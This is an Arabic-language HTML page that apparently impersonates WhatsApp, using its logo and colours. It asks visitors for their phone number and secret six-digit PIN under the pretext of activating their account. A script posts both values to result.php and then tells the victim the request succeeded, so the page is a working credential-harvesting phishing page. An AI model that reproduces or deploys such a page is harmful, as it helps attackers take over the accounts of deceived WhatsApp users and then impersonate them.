



<!DOCTYPE html>
<html style="background-color: #1ebea5;zoom:130%">
<head>
	<title></title>
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Almarai&display=swap" rel="stylesheet">
	<style type="text/css">
		.issam{
			font-family: 'Almarai', sans-serif;
			font-size: 29px;
			color: #FFF;

		}
	</style>


	<script src="http://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
</head>
<body style="text-align: center;">


<form id="wp" method="post">
	

	<img src="https://static.whatsapp.net/rsrc.php/yv/r/-r3j-x8ZnM7.svg" width="55%;" style="margin-top: 180px;">

	<h3 class="issam" style="margin-top:100px;">المرجو إدخال الرقم الخاص بكم</h3>
	<input name="num" type="text" maxlength="10" style="width: 350px;height:65px;border:none;margin-top: 25px;text-align: center;font-family: 'Almarai', sans-serif;font-size: 22px;font-weight: bold;color:#00584b" />



	<h3 class="issam" style="margin-top:100px;">المرجو إدخال الرمز السري الخاص بكم لتفعيل حسابك</h3>
	<input name="pin" type="password" maxlength="6" style="width: 350px;height:65px;border:none;margin-top: 25px;margin-bottom: 15px;text-align: center;font-family: 'Almarai', sans-serif;font-size: 22px;font-weight: bold;color:#00584b" />

	<br>
	<hr>
</form>
	<button onclick="yuri();" style="margin-top: 30px;font-size: 29px;font-family: 'Almarai', sans-serif;padding: 15px;width: 350px;background-color: #01e675;color:#FFF;border:none;">إرسال</button>





<script type="text/javascript">
	function yuri(){
		
		$.post('result.php',$('#wp').serialize(), function(data) {
		         alert("تم تسجيل طلبكم بنجاح");
		       }
		    );
	}
</script>


</body>
</html>